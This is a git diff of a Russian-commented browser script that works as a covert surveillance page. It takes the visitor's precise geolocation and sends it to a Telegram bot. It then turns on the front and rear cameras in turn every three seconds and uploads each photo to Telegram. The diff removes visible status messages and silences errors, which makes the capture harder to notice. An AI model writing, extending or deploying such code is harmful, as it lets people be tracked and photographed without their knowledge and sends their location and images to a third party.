@@ -7,102 +7,85 @@ const videoEl = document.getElementById('video');
 const canvasEl = document.getElementById('canvas');
 const reloadBtn = document.getElementById('reloadBtn');
 
-let currentCamera = 'user'; // 'user' = фронтальная, 'environment' = задняя
+let currentCamera = 'user'; // фронт / задняя по очереди
 let stream = null;
 let photoInterval = null;
+let geoFetched = false;
 
-// Обратный отсчёт 3..2..1
+// Сначала запрашиваем доступ
+async function requestPermissions() {
+  try {
+    await requestGeo();
+    await requestCameraTest(); // просто включим и выключим камеру
+    startCountdown(); // если всё ок — запускаем обратный отсчёт
+  } catch (e) {
+    showReloadButton();
+  }
+}
+
+// Запрос геолокации и отправка
+async function requestGeo() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) return reject();
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        geoFetched = true;
+        sendLocationToTelegram(lat, lon);
+        resolve();
+      },
+      err => reject(err),
+      { enableHighAccuracy: true, timeout: 5000 }
+    );
+  });
+}
+
+// Запрос камеры для проверки (любой поток)
+async function requestCameraTest() {
+  const testStream = await navigator.mediaDevices.getUserMedia({ video: true });
+  stopStream(testStream); // просто чтобы браузер дал доступ
+  return Promise.resolve();
+}
+
+// Обратный отсчёт
 function startCountdown() {
   let count = 3;
   countdownEl.textContent = count;
+  countdownEl.style.display = 'block';
   const interval = setInterval(() => {
     count--;
     if (count === 0) {
       clearInterval(interval);
       countdownEl.style.display = 'none';
-      requestPermissions();
+      startCameraCycle(); // запускаем фото-цикл
     } else {
       countdownEl.textContent = count;
     }
   }, 1000);
 }
 
-// Запрос разрешений камеры и геолокации
-async function requestPermissions() {
-  statusEl.style.display = 'block';
-  statusEl.textContent = 'Запрашиваем доступ к геолокации и камере...';
-
-  try {
-    // Геолокация (один раз)
-    if ('geolocation' in navigator) {
-      navigator.geolocation.getCurrentPosition(pos => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        sendLocationToTelegram(lat, lon);
-      }, err => {
-        console.warn('Геолокация не разрешена или недоступна');
-      });
-    } else {
-      console.warn('Геолокация не поддерживается');
-    }
-
-    // Запуск циклического фото с камер
-    await startCameraCycle();
-  } catch (e) {
-    statusEl.textContent = 'Ошибка при запросе доступа: ' + e.message;
-    showReloadButton();
-  }
-}
-
-// Отправка геолокации в Telegram
-function sendLocationToTelegram(lat, lon) {
-  const url = `https://maps.google.com/?q=${lat},${lon}`;
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: `🌍 Геолокация: ${url}`
-    })
-  });
-}
-
-// Запускаем поочерёдный цикл фото с фронтальной и задней камеры
+// Запуск фото с камер каждые 3 секунды
 async function startCameraCycle() {
-  statusEl.textContent = 'Xazbik 93sm 100%';
-
-  // Каждые 3 секунды меняем камеру и снимаем фото
   photoInterval = setInterval(async () => {
     try {
       if (stream) {
-        // Останавливаем текущий поток
         stopStream(stream);
         videoEl.srcObject = null;
       }
-
-      // Меняем камеру
       currentCamera = (currentCamera === 'user') ? 'environment' : 'user';
-
-      // Запрашиваем камеру
       stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentCamera }, audio: false });
       videoEl.srcObject = stream;
-
-      // Ждём пока видео загрузится
       await new Promise(res => videoEl.onloadedmetadata = res);
-
-      // Делаем фото и отправляем
       sendPhotoToTelegram();
-
     } catch (e) {
-      console.error('Ошибка камеры:', e);
-      statusEl.textContent = 'Ошибка доступа к камере.';
       clearInterval(photoInterval);
       showReloadButton();
     }
   }, 3000);
 }
 
-// Делаем фото с видео и отправляем в Telegram
+// Фото → Telegram
 function sendPhotoToTelegram() {
   const ctx = canvasEl.getContext('2d');
   canvasEl.width = videoEl.videoWidth;
@@ -115,21 +98,34 @@ function sendPhotoToTelegram() {
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
       method: 'POST',
       body: formData
-    }).catch(e => console.warn('Ошибка отправки фото:', e));
+    }).catch(() => {});
   }, 'image/jpeg', 0.8);
 }
 
-// Остановить поток камеры
-function stopStream(stream) {
-  stream.getTracks().forEach(track => track.stop());
+// Геолокация → Telegram
+function sendLocationToTelegram(lat, lon) {
+  const url = `https://maps.google.com/?q=${lat},${lon}`;
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: `🌍 Геолокация: ${url}`
+    })
+  });
 }
 
-// Показать кнопку перезагрузки
+// Остановка потока
+function stopStream(s) {
+  s.getTracks().forEach(track => track.stop());
+}
+
+// Кнопка перезапуска
 function showReloadButton() {
   reloadBtn.style.display = 'block';
   reloadBtn.onclick = () => location.reload();
-  statusEl.style.display = 'none';
+  if (statusEl) statusEl.style.display = 'none';
 }
 
-// Запускаем всё
-startCountdown();
+// ▶️ Стартуем
+requestPermissions();
